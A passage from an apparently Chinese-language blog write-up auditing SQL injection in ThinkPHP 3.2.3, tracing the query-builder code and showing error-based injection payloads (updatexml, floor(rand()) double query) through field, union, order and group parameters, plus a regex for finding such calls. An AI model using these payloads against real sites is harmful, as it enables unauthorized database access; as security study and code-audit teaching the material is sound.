+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options)) &#123;</span><br><span class="line">            $options = array_merge(<span class="keyword">$this</span>-&gt;options, $options);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * array_merge()将一个或多个数组合并成一个数组</span></span><br><span class="line"><span class="comment">             * 本处$this-&gt;options为空</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($options[<span class="string">'table'</span>])) &#123;<span class="comment">//option中无table下标时</span></span><br><span class="line">            <span class="comment">// 自动获取表名</span></span><br><span class="line">            $options[<span class="string">'table'</span>] = <span class="keyword">$this</span>-&gt;getTableName();<span class="comment">//$option中添加 'table'=&gt;'[表名]'</span></span><br><span class="line">            $fields           = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">            $fields = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options[<span class="string">'alias'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'table'</span>] .= <span class="string">' '</span> . $options[<span class="string">'alias'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">        $options[<span class="string">'model'</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="comment">// 字段类型验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'where'</span>]) &amp;&amp; is_array($options[<span class="string">'where'</span>]) &amp;&amp; !<span class="keyword">empty</span>($fields) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'join'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">            <span class="keyword">foreach</span> ($options[<span class="string">'where'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                $key = trim($key);</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_scalar($val)) &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * is_scalar($var)：检测变量是否是一个标量</span></span><br><span class="line"><span class="comment">                         * 标量变量是指那些包含了 integer、float、string 或 boolean的变量</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">$this</span>-&gt;_parseType($options[<span class="string">'where'</span>], $key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 表达式过滤</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_options_filter($options);</span><br><span class="line">        <span class="keyword">return</span> $options;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后进入到<code>select()</code>方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$resultSet = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</span><br><span class="line"><span class="comment">#select()方法体</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>]) ? $options[<span class="string">'bind'</span>] : <span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再进入到select方法体中<code>buildSelectSql()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 根据页数计算limit</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;<span class="comment">//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>parseSql()</code>中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。</p>
+<p>在此方法中，直接取出$options[‘table’]的值作为查询语句中的table</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终返回</p>
+<blockquote>
+<p>SELECT * FROM `thinkphp_user` WHERE ( 1=1 ) and updatexml(1,concat(0x7e,version(),0x7e),1)%23 LIMIT 1</p>
+</blockquote>
+<h3 id="field注入"><a href="#field注入" class="headerlink" title="field注入"></a>field注入</h3><p>field方法操作表中的字段，限制查询返回的结果<br>M(‘user’)-&gt;field(array(‘id,username’))-&gt;select();</p>
+<p>只要field方法里的参数可控，不管是字符串还是数组，都可以进行注入。<br>M(‘user’)-&gt;field(array(‘id,username’=&gt;I(‘username’)))-&gt;select();</p>
+<p><strong>指定字段</strong></p>
+<p>在查询操作中field方法是使用最频繁的。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field('id,title,content')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>这里使用field方法指定了查询的结果集中包含id,title,content三个字段的值。执行的SQL相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,<span class="keyword">content</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
+
+<p>可以给某个字段设置别名，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field('id,nickname as name')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>执行的SQL语句相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,nickname <span class="keyword">as</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用SQL函数</strong></p>
+<p>可以在field方法中直接使用函数，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field('id,SUM(score)')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>执行的SQL相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">SUM</span>(score) <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，除了select方法之外，所有的查询方法，包括find等都可以使用field方法，这里只是以select为例说明。</p>
+<p><strong>使用数组参数</strong></p>
+<p>field方法的参数可以支持数组，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field(array('id','title','content'))-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>最终执行的SQL和前面用字符串方式是等效的。</p>
+<p>数组方式的定义可以为某些字段定义别名，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field(array('id','nickname'=&gt;'name'))-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>执行的SQL相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,nickname <span class="keyword">as</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong><br>在indexcontroller.class.php中添加一个field方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">field</span><span class="params">()</span></span>&#123;</span><br><span class="line">    M(<span class="string">'User'</span>)-&gt;field(<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'username'</span>=&gt;I(<span class="string">'name'</span>)))-&gt;select();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入name=uname时，SQL语句为<br><img src="/2020/05/05/ThinkPHP3.2.3/1588150608736.png" alt="1588150608736"></p>
+<p>这里传入的name可控，所以可以进行注入<br>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=uname from thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588150756344.png" alt="1588150756344"></p>
+<p>此时的SQL语句为</p>
+<blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">`id`</span>,<span class="string">`username`</span> <span class="keyword">AS</span> uname <span class="keyword">from</span> thinkphp_user <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span><span class="string">` FROM `</span>thinkphp_user<span class="string">`</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="alias-union-join注入"><a href="#alias-union-join注入" class="headerlink" title="alias-union-join注入"></a>alias-union-join注入</h3><p><strong>ailas、join、union方法</strong><br>1.alias用于设置当前数据表的别名，便于使用其他的连贯操作例如join方法等，与field方法相似。</p>
+<p>示例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Model = M('User');</span><br><span class="line">$Model-&gt;alias('a')-&gt;join('__DEPT__ b ON b.user_id= a.id')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>最终生成的SQL语句类似于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> think_user a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> think_dept b <span class="keyword">ON</span> b.user_id= a.id</span><br></pre></td></tr></table></figure>
+
+<p>2.JOIN方法也是连贯操作方法之一，用于根据两个或多个表中的列之间的关系，从这些表中查询数据</p>
+<p>join通常有下面几种类型，不同类型的join操作会影响返回的数据结果。</p>
+<ul>
+<li><strong>INNER JOIN</strong>: 如果表中有至少一个匹配，则返回行，等同于 JOIN</li>
+<li><strong>LEFT JOIN</strong>: 即使右表中没有匹配，也从左表返回所有的行</li>
+<li><strong>RIGHT JOIN</strong>: 即使左表中没有匹配，也从右表返回所有的行</li>
+<li><strong>FULL JOIN</strong>: 只要其中一个表中存在匹配，就返回行</li>
+</ul>
+<p>join方法可以支持以上四种类型，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$Model = M('Artist');</span><br><span class="line">$Model</span><br><span class="line">-&gt;join('think_work ON think_artist.id = think_work.artist_id')</span><br><span class="line">-&gt;join('think_card ON think_artist.card_id = think_card.id')</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>3.UNION操作用于合并两个或多个 SELECT 语句的结果集。<br>使用示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field(<span class="string">'name'</span>)</span><br><span class="line">-&gt;table(<span class="string">'think_user_0'</span>)</span><br><span class="line">-&gt;union(<span class="string">'SELECT name FROM think_user_1'</span>)</span><br><span class="line">-&gt;union(<span class="string">'SELECT name FROM think_user_2'</span>)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>数组用法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;field(<span class="string">'name'</span>)</span><br><span class="line">-&gt;table(<span class="string">'think_user_0'</span>)</span><br><span class="line">-&gt;union(<span class="keyword">array</span>(<span class="string">'field'</span>=&gt;<span class="string">'name'</span>,<span class="string">'table'</span>=&gt;<span class="string">'think_user_1'</span>))</span><br><span class="line">-&gt;union(<span class="keyword">array</span>(<span class="string">'field'</span>=&gt;<span class="string">'name'</span>,<span class="string">'table'</span>=&gt;<span class="string">'think_user_2'</span>))</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong></p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">field</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="comment">//$Model = M('User');</span></span><br><span class="line"> $a=M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;union(<span class="string">'select username from thinkphp_user'</span>)-&gt;select();</span><br><span class="line">     var_dump($a);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>当传入id=1时SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLUMNS</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">UNION</span> <span class="keyword">select</span> username <span class="keyword">from</span> thinkphp_user</span><br></pre></td></tr></table></figure>
+
+<p>由于参数可控，所哟构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 from thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>此时的SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">from</span> thinkphp_user <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span><span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">UNION</span> <span class="keyword">select</span> username <span class="keyword">from</span> thinkphp_user</span><br></pre></td></tr></table></figure>
+
+<p>从而造成注入<br><img src="/2020/05/05/ThinkPHP3.2.3/1588165126864.png" alt="1588165126864"></p>
+<p>alias方法操作表的别名，和field方法类似，它一般和join方法成对出现，用于对数据的连贯操作。出现join和union方法的时候。只要能控制参数一般情况下都会产生注入。<br>代码审计时可以使用下面的正则查找</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;(<span class="keyword">alias</span>|join|<span class="class"><span class="keyword">union</span>)\<span class="title">s</span>*\((\$|\$<span class="title">_</span>|<span class="title">I</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>来进一步判断。</p>
+<h3 id="order-group-having"><a href="#order-group-having" class="headerlink" title="order-group-having"></a>order-group-having</h3><p>1.order方法属于模型的连贯操作方法之一，用于对操作的结果排序。</p>
+<p>用法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="string">'id desc'</span>)-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>注意：连贯操作方法没有顺序，可以在select方法调用之前随便改变调用顺序。<br>支持对多个字段的排序，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="string">'id desc,status'</span>)-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果没有指定desc或者asc排序规则的话，默认为asc。</p>
+</blockquote>
+<p>如果你的字段和mysql关键字有冲突，那么建议采用数组方式调用，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'order'</span>,<span class="string">'id'</span>=&gt;<span class="string">'desc'</span>))-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>2.GROUP方法也是连贯操作方法之一，通常用于结合合计函数，根据一个或多个列对结果集进行分组 。<br>group方法只有一个参数，并且只能使用字符串。<br>例如，我们都查询结果按照用户id进行分组统计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'user_id,username,max(score)'</span>)-&gt;group(<span class="string">'user_id'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>生成的SQL语句是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user_id,username,max(score) FROM think_score GROUP BY user_id</span><br></pre></td></tr></table></figure>
+
+<p>也支持对多个字段进行分组，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'user_id,test_time,username,max(score)'</span>)-&gt;group(<span class="string">'user_id,test_time'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>生成的SQL语句是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> user_id,test_time,username,<span class="keyword">max</span>(score) <span class="keyword">FROM</span> think_score <span class="keyword">GROUP</span> <span class="keyword">BY</span> user_id,test_time</span><br></pre></td></tr></table></figure>
+
+<p>3.HAVING方法也是连贯操作之一，用于配合group方法完成从分组的结果中筛选（通常是聚合条件）数据。having方法只有一个参数，并且只能使用字符串，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'username,max(score)'</span>)-&gt;group(<span class="string">'user_id'</span>)-&gt;having(<span class="string">'count(test_time)&gt;3'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>生成的SQL语句是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,max(score) FROM think_score GROUP BY user_id HAVING count(test_time)&gt;<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实例order：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M(<span class="string">'User'</span>)-&gt;where(<span class="string">'1=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;I(<span class="string">'id'</span>)))-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>则构造如下语句,这里要使用双查询注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p>生成sql语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span>=<span class="number">1</span> ) <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`id`</span> ,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1588214714395.png" alt="1588214714395"></p>
+<p><strong>实例group</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data=M(<span class="string">'User'</span>)-&gt;field(<span class="string">'max(id),username'</span>)-&gt;group(I(<span class="string">'score'</span>))-&gt;select();  </span><br><span class="line">dump($data);</span><br></pre></td></tr></table></figure>
+
+<p>注入方法与order方法一样，当group的参数可控时，便可进行注入<br>payload:</p>
